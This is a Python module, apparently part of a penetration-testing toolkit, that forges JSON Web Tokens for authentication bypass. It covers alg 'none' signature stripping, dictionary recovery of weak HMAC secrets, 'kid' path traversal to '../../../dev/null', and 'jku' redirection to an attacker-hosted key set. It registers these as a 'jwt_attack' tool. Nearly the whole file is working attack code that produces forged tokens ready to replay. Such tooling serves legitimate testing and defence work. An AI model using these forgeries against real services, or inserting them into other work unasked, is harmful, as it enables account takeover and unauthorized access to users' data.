"""JWT attacks: alg-none, weak HMAC, kid traversal, jku redirect.

Every test returns a token plus the verdict; nothing here talks to a
target, so the module is testable offline and composable with `replay`.
`confirmed` requires the forged token to be structurally valid and
different from the original.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable, Iterable, Optional

from ..core.errors import ToolError
from ..core.policy import Capability
from ..core.logging_setup import get_logger

_log = get_logger(__name__)
__all__ = ["WEAK_SECRETS", "decode", "encode", "alg_none", "weak_hmac",
           "kid_traversal", "jku_redirect", "attack", "register"]

WEAK_SECRETS: tuple[str, ...] = (
    "secret", "password", "changeme", "jwt", "key", "private", "admin",
    "supersecret", "s3cr3t", "jwtsecret", "token", "app", "api",
    "your-256-bit-secret", "development", "prod", "test", "staging",
    "secretkey", "secret_key", "jwt_secret", "mysecret", "1234567890",
)


def _b64d(part: str) -> bytes:
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def decode(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    parts = (token or "").split(".")
    if len(parts) != 3:
        raise ToolError("not a JWT (need 3 segments)")
    try:
        header = json.loads(_b64d(parts[0]))
        payload = json.loads(_b64d(parts[1]))
    except (ValueError, json.JSONDecodeError) as exc:
        raise ToolError(f"undecodable JWT: {exc}") from exc
    return header, payload, parts[2]


def encode(header: dict[str, Any], payload: dict[str, Any],
           signature: bytes = b"") -> str:
    head = _b64e(json.dumps(header, separators=(",", ":")).encode())
    body = _b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{head}.{body}.{_b64e(signature) if signature else ''}"


def _hs(alg: str, key: bytes, signing_input: str) -> bytes:
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
              "HS512": hashlib.sha512}[alg]
    return hmac.new(key, signing_input.encode(), digest).digest()


def alg_none(token: str, *, variants: Iterable[str] = ("none", "None", "NONE")
             ) -> list[dict[str, Any]]:
    """Strip the signature. Variant casing matters — some parsers are
    case-sensitive and only one spelling is accepted."""
    header, payload, _ = decode(token)
    out = []
    for alg in variants:
        forged = encode({**header, "alg": alg}, payload)
        out.append({"test": "alg_none", "alg": alg, "token": forged,
                    "verdict": "candidate",
                    "note": "replay and compare against a rejected request"})
    return out


def weak_hmac(token: str, *, secrets: Iterable[str] = WEAK_SECRETS
              ) -> list[dict[str, Any]]:
    """Recover the key by dictionary. A hit is `confirmed` — the signature
    reproduces the original exactly."""
    header, _, original_sig = decode(token)
    alg = str(header.get("alg", "HS256")).upper()
    if alg not in ("HS256", "HS384", "HS512"):
        return [{"test": "weak_hmac", "verdict": "n/a",
                 "note": f"alg is {alg}"}]
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}"
    out = []
    for secret in secrets:
        sig = _b64e(_hs(alg, secret.encode(), signing_input))
        if hmac.compare_digest(sig, original_sig):
            out.append({"test": "weak_hmac", "verdict": "confirmed",
                        "secret": secret, "alg": alg,
                        "note": "signature reproduced — key recovered"})
    if not out:
        out.append({"test": "weak_hmac", "verdict": "rejected",
                    "note": f"{len(list(secrets))} secrets tried"})
    return out


def kid_traversal(token: str, *, path: str = "../../../dev/null",
                  secret: str = "") -> dict[str, Any]:
    """`kid` pointing at a predictable file. With `secret` the token is
    signed using the file's own content as the key."""
    header, payload, _ = decode(token)
    key = secret or ""
    alg = str(header.get("alg", "HS256")).upper()
    new_header = {**header, "kid": path}
    signing_input = f"{_b64e(json.dumps(new_header, separators=(',', ':')).encode())}." \
                    f"{_b64e(json.dumps(payload, separators=(',', ':')).encode())}"
    sig = _hs(alg, key.encode(), signing_input) if alg.startswith("HS") else b""
    return {"test": "kid_traversal", "kid": path, "token": encode(new_header,
                                                                  payload, sig),
            "verdict": "candidate",
            "note": "works when the server reads the key from the kid path"}


def jku_redirect(token: str, jku_url: str, *, kid: str = "attacker",
                 jwk: Optional[dict[str, Any]] = None) -> dict[str, Any]:
    """Point `jku` at a key set you host. Header becomes HS→RS confusion
    only if the server fetches blindly — this returns the RS256 shape."""
    header, payload, _ = decode(token)
    new_header = {**header, "alg": "RS256", "jku": jku_url, "kid": kid}
    new_header.pop("jwk", None)
    return {"test": "jku_redirect", "jku": jku_url,
            "token": encode(new_header, payload),
            "verdict": "candidate",
            "note": "sign with your own key; include the JWKS at jku_url"}


def attack(token: str, *, jku_url: str = "") -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    out += alg_none(token)
    out += weak_hmac(token)
    out.append(kid_traversal(token))
    if jku_url:
        out.append(jku_redirect(token, jku_url))
    return out


def register(registry: Any) -> None:
    @registry.register("jwt_attack",
                       description="JWT forgery tests: alg none, weak HMAC "
                                   "dictionary, kid traversal, jku redirect.",
                       capability=Capability.DB_READ,
                       parameters={"token": "str", "jku": "str (optional)"})
    def jwt_attack(token: str, *, jku: str = "") -> dict[str, Any]:
        results = attack(token, jku_url=jku)
        return {"results": results,
                "confirmed": [r for r in results
                              if r.get("verdict") == "confirmed"]}
